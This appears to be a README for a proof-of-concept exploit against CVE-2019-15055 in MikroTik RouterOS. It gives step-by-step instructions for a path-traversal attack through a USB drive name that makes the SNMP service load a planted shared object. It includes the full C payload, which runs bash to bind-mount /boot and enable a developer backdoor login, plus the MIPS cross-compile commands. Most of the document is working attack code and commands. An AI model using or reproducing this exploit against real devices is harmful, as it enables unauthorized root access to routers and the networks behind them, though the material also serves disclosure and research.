# CVE-2019-15055

This vulnerability requires a USB or drive be mounted and visible in System -> Disk. Assuming you have control of the USB create the directory structure "/nova/lib/snmp/" and store lol_mips.so in the snmp subdirectory. Note that the shared object is compiled as mips big endian. If your target uses a different architecture than you'll need to recompile it.

Next change the drive's name to "../../../ram/pckg/snmp_xploit" and enable (or restart) the SNMP process. This should cause SNMP to load the shared object on the USB. The shared object simply does the following:

```sh
albinolobster@ubuntu:~/routeros/poc/cve_2019_15055/shared_obj$ cat snmp_exec.c 
#include <unistd.h>
#include <stdlib.h>

void __attribute__((constructor)) lol(void)
{
    int fork_result = fork();
    if (fork_result == 0)
    {
        execl("/bin/bash", "bash", "-c", "mkdir /pckg/option; mount -o bind /boot/ /pckg/option", (char *) 0);
        exit(0);
    }
}

extern void autorun(void)
{
    // do nothin' I guess?
    return; 
}
```

So you should now be able to login to through the devel backdoor.

## Affected versions
At the time of commit, this has been fixed in 6.46rc34 and 6.45.5. Long-term still has no fix.

## Compiling the shared object

```
albinolobster@ubuntu:~/routeros/poc/cve_2019_15055/shared_obj$ ~/cross-compiler-mips/bin/mips-gcc -c -fpic snmp_exec.c
albinolobster@ubuntu:~/routeros/poc/cve_2019_15055/shared_obj$ ~/cross-compiler-mips/bin/mips-gcc -shared -s -o lol_mips.so snmp_exec.o
```

